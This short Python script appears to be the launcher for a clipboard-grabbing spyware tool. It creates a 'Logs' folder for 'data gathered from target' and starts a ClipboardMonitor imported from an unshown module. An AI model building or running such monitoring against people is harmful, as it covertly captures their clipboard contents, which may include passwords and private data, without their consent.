import os
from clipboard_grap import ClipboardMonitor

if __name__ == "__main__":

    # creating folder "Logs" to store all the data gathered from target
    if not os.path.exists("../Logs"):
        relative_path = "../Logs"

        script_directory = os.path.dirname(os.path.abspath(__file__))
        log_folder_path = os.path.join(script_directory, relative_path)

        os.makedirs(log_folder_path, exist_ok=True)

    bh = ClipboardMonitor()
    bh.start_monitoring()

